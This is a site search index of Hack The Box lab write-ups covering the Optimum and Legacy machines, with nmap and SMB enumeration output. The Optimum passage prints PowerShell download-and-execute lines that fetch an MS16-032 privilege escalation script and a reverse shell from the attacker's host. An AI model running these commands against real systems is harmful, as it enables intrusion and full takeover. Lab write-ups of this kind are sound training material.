[{"id":0,"href":"/topics/","title":"Topics","parent":"Sal O'Rak","content":" What does these cover? ","description":" What does these cover? "},{"id":1,"href":"/writeups/","title":"Writeups","parent":"Sal O'Rak","content":"This is the Write-Ups section.\nTable of Contents Linux Optimum Windows Legacy Related tags #windows #linux #macos #active-directory #smtp #smb #ssh #http #mysql #mssql #bof\n","description":"This is the Write-Ups section.\nTable of Contents Linux Optimum Windows Legacy Related tags #windows #linux #macos #active-directory #smtp #smb #ssh #http #mysql #mssql #bof"},{"id":2,"href":"/writeups/linux/","title":"Linux","parent":"Writeups","content":" Linux export TOKEN=$(cat ~/tokens/token-1) \u0026amp;\u0026amp; docker build -t $TOKEN.name . ","description":" Linux export TOKEN=$(cat ~/tokens/token-1) \u0026amp;\u0026amp; docker build -t $TOKEN.name . "},{"id":3,"href":"/writeups/linux/optimum/","title":"Optimum","parent":"Linux","content":" Optimum #web #hfs #technique-webserver #searchsploit #cve-exploit\nIP: 10.10.10.8 Start date: [[2022-04-14]] End date: [[2022-04-15]]\n1.0 Enumeration - Nmap Initial enumeration.\ntitle: `nmap -SCV -p- -n -Pn --min-rate 5000 -oA nmap/optimum.tcp 10.10.10.8` collapse: open ```python PORT STATE SERVICE VERSION 80/tcp open http HttpFileServer httpd 2.3 |_http-title: HFS / |_http-server-header: HFS 2.3 Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows There is only one port open, which is 80 and hosting a http web server running HttpFileServer version httpd 2.3.\nWe also run an UDP scanning nmap -sU -n -Pn --min-rate 5000 nmap/optimum.udp 10.10.10.8 but it returns nothing.\n1.1 Enumeration - Port 80 The first I notice is the web server is running HttpFileServer 2.3, so I run a searchsploit httpd to check if the version is vulnerable or has a public exploit out in the wild.\nThere is a remote code execution (rce) vulnerability.\nThe exploit abuses the search functionality by using a null character( %00).\n2.0 Exploitation -\u0026gt; kostas Exploiting the vulnerability is quite easy and can be done by varios ways, the easiest is to forge a custom GET request to execute a powershell.\ntitle: Architecture issues By running `systeminfo` inside the victim machine we know the system is **x64-based PC**. It is important to notice that if we run the standard `powershell` inside our rce.py exploit it will get us a powershell 32-bit process inside a x64 OS ! This is probabily because the HFS (httpfileserver) process is likely running as a 32-bit process. To check the CLI process architecture we can run `[Environment]::Is64BitProcess`. In a 64-bit Windows to get the 64-bit version of powershell we can run powershell directly from its directory `C:\\Windows\\sysNative\\WindowsPowerShell\\v1.0\\powershell.exe` this will return a 64-bit powershell process. More information about process architecture at [[Powershell Shell Version]] The exploit returns a stable shell as user kostas. ![[httpfileserver_vuln_rce.png]]\n3.0 Privilege escalation: kostas \u0026ndash;\u0026gt; nt authority We run an initial check on the system by running systeminfo and sending it to our machine and running windows-exploit-suggester.\ntitle: `python2.7 windows-exploit-suggester --database db.xls --systeminfo sysinfo` It returns a lot of possible exploits that are vulnerable, let\u0026#39;s try one that allows us to escalate privileges. (..) ```python [M] MS16-016: Security Update for WebDAV to Address Elevation of Privilege (3136041) - Important [*] https://www.exploit-db.com/exploits/40085/ -- MS16-016 mrxdav.sys WebDav Local Privilege Escalation, MSF [*] https://www.exploit-db.com/exploits/39788/ -- Microsoft Windows 7 - WebDAV Privilege Escalation Exploit (MS16-016) (2), PoC [*] https://www.exploit-db.com/exploits/39432/ -- Microsoft Windows 7 SP1 x86 - WebDAV Privilege Escalation (MS16-016) (1), PoC (..)\nWe can get a .ps1 version of the exploit by running searchsploit ms16-032.\n```ad-note title: Automatic ``.ps1` function execution. When treating a `.ps1` function we want to run, there is a simple trick to run it without importing it as a module in powershell. This is by adding the function we previously declared at the end of the file. In our case we declare the function `function Invoke-MS16-032 {..}`, so we add an extra line at the end of the line `Invoke-MS16-032`. title: New GUI shell using searchsploit `.ps1` exploit. Running the previous exploit tells us an new shell has been opened but nothing spawns. This is probably (confirmed) that a new shell is literally being spawned, ie another GUI process. If we run it multiple times we will see that multiple `cmd` processs have been initialized. Empire did a re-edit of the exploit to allow command execution. The exploit can be found here [Invoke-MS16-032](https://github.com/EmpireProject/Empire/blob/master/data/module_source/privesc/Invoke-MS16032.ps1) Next step is now to use the switch `-command` to send a reverse shell inside the administrator shell. title: `IEX(New-Object Net.WebClient).downloadString(\u0026#34;http://10.10.14.2:8000/Invoke-MS16-032.ps1\u0026#34;)` First of all, we modify the last line we added to the`.ps1` to invoke us a reverse shell. In this case we will host a python web server with a rev.ps1 (from nishang) which will be listening on port `443` `Invoke-MS16032 -Command IEX(New-Object Net.WebClient).downloadString(\u0026#34;http://10.10.14.2:8000/rev.ps1\u0026#34;)` On running we get the shell as `nt authority / system`. Voila! We are root!. ![[root.png]] Flags\nUser: d0c39409d7b994a9a1389ebf38ef5f73 Root: 51ed1b36553c8461f4552c2e92b3eeed ","description":"Optimum #web #hfs #technique-webserver #searchsploit #cve-exploit\nIP: 10.10.10.8 Start date: [[2022-04-14]] End date: [[2022-04-15]]\n1.0 Enumeration - Nmap Initial enumeration.\ntitle: `nmap -SCV -p- -n -Pn --min-rate 5000 -oA nmap/optimum.tcp 10.10.10.8` collapse: open ```python PORT STATE SERVICE VERSION 80/tcp open http HttpFileServer httpd 2.3 |_http-title: HFS / |_http-server-header: HFS 2.3 Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows There is only one port open, which is 80 and hosting a http web server running HttpFileServer version httpd 2."},{"id":4,"href":"/writeups/windows/","title":"Windows","parent":"Writeups","content":" Windows Section Powershell script example\nGet-CimInstance -Class Win32_SystemDriver | Where-Object {$_.State -eq \u0026#34;Running\u0026#34;} | Where-Object {$_.StartMode -eq \u0026#34;Auto\u0026#34;} ","description":" Windows Section Powershell script example\nGet-CimInstance -Class Win32_SystemDriver | Where-Object {$_.State -eq \u0026#34;Running\u0026#34;} | Where-Object {$_.StartMode -eq \u0026#34;Auto\u0026#34;} "},{"id":5,"href":"/writeups/windows/legacy/","title":"Legacy","parent":"Windows","content":" System data Domain name: LEGACY\nWindows versions: Windows 5.1\nIt seems to be vulnerable to ms08-067\nUsing msfconsole is super easy to exploit the system and get both the user and root flag at the same time. I\u0026rsquo;m going to try to exploit it manually.\nFlow process title: Port scanning collapse: closed ```ad-question title: `nmap --open -T5 -p- -vvv 10.10.10.4 -n -Pn -oG nmap/allports` collapse: closed ~~~python PORT STATE SERVICE REASON 139/tcp open netbios-ssn syn-ack 445/tcp open microsoft-ds syn-ack ``` ```ad-question title: `nmap -sCV -pC^V 10.10.10.4` collapse: closed ~~~python PORT STATE SERVICE VERSION 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Windows XP microsoft-ds Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp Host script results: |_smb2-time: Protocol negotiation failed (SMB2) |_clock-skew: mean: 5d00h02m50s, deviation: 1h24m51s, median: 4d23h02m50s |_nbstat: NetBIOS name: LEGACY, NetBIOS user: \u0026lt;unknown\u0026gt;, NetBIOS MAC: 00:50:56:b9:36:6b (VMware) | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) | smb-os-discovery: | OS: Windows XP (Windows 2000 LAN Manager) | OS CPE: cpe:/o:microsoft:windows_xp::- | Computer name: legacy | NetBIOS computer name: LEGACY\\x00 | Workgroup: HTB\\x00 |_ System time: 2022-01-08T00:37:37+02:00 ``` ```ad-question title: `nmap -sU -Pn 10.10.10.4` collapse: closed ~~~python PORT STATE SERVICE 137/udp open netbios-ns ``` ```ad-danger title: `nmap --script \u0026#34;smb-vuln*\u0026#34; 10.10.10.4 -Pn` collapse: closed ~~~python Host script results: |_smb-vuln-ms10-054: false |_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug) | smb-vuln-ms08-067: | VULNERABLE: | Microsoft Windows system vulnerable to remote code execution (MS08-067) | State: VULNERABLE | IDs: CVE:CVE-2008-4250 | The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2, | Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary | code via a crafted RPC request that triggers the overflow during path canonicalization. | | Disclosure date: 2008-10-23 | References: | https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250 |_ https://technet.microsoft.com/en-us/library/security/ms08-067.aspx | smb-vuln-ms17-010: | VULNERABLE: | Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010) | State: VULNERABLE | IDs: CVE:CVE-2017-0143 | Risk factor: HIGH | A critical remote code execution vulnerability exists in Microsoft SMBv1 | servers (ms17-010). | | Disclosure date: 2017-03-14 | References: | https://technet.microsoft.com/en-us/library/security/ms17-010.aspx | https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/ |_ https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143 title: Mapping samba shares collpase: closed As a consecuence of having just SMB ports open (139, 445) Ill perform an smb mapping using `enum4linux` ```ad-question title: `enum4linux 10.10.10.4` collapse:closed ~~~python ========================== | Target Information | ========================== Target ........... 10.10.10.4 RID Range ........ 500-550,1000-1050 Username ......... \u0026#39;\u0026#39; Password ......... \u0026#39;\u0026#39; Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none ================================================== | Enumerating Workgroup/Domain on 10.10.10.4 | ================================================== [+] Got domain/workgroup name: HTB ========================================== | Nbtstat Information for 10.10.10.4 | ========================================== Looking up status of 10.10.10.4 LEGACY \u0026lt;00\u0026gt; - B \u0026lt;ACTIVE\u0026gt; Workstation Service HTB \u0026lt;00\u0026gt; - \u0026lt;GROUP\u0026gt; B \u0026lt;ACTIVE\u0026gt; Domain/Workgroup Name LEGACY \u0026lt;20\u0026gt; - B \u0026lt;ACTIVE\u0026gt; File Server Service HTB \u0026lt;1e\u0026gt; - \u0026lt;GROUP\u0026gt; B \u0026lt;ACTIVE\u0026gt; Browser Service Elections HTB \u0026lt;1d\u0026gt; - B \u0026lt;ACTIVE\u0026gt; Master Browser ..__MSBROWSE__. \u0026lt;01\u0026gt; - \u0026lt;GROUP\u0026gt; B \u0026lt;ACTIVE\u0026gt; Master Browser MAC Address = 00-50-56-B9-36-6B ``` ```ad-question title: ` crackmapexec smb 10.10.10.4` collapse: closed ~~~python SMB 10.10.10.4 445 LEGACY [*] Windows 5.1 (name:LEGACY) (domain:legacy) (signing:False) (SMBv1:True) ``` ","description":"System data Domain name: LEGACY\nWindows versions: Windows 5.1\nIt seems to be vulnerable to ms08-067\nUsing msfconsole is super easy to exploit the system and get both the user and root flag at the same time. I\u0026rsquo;m going to try to exploit it manually.\nFlow process title: Port scanning collapse: closed ```ad-question title: `nmap --open -T5 -p- -vvv 10.10.10.4 -n -Pn -oG nmap/allports` collapse: closed ~~~python PORT STATE SERVICE REASON 139/tcp open netbios-ssn syn-ack 445/tcp open microsoft-ds syn-ack ``` ```ad-question title: `nmap -sCV -pC^V 10."},{"id":6,"href":"/","title":"Sal O'Rak","parent":"","content":"","description":""},{"id":7,"href":"/tags/","title":"Tags","parent":"Sal O'Rak","content":"","description":""}]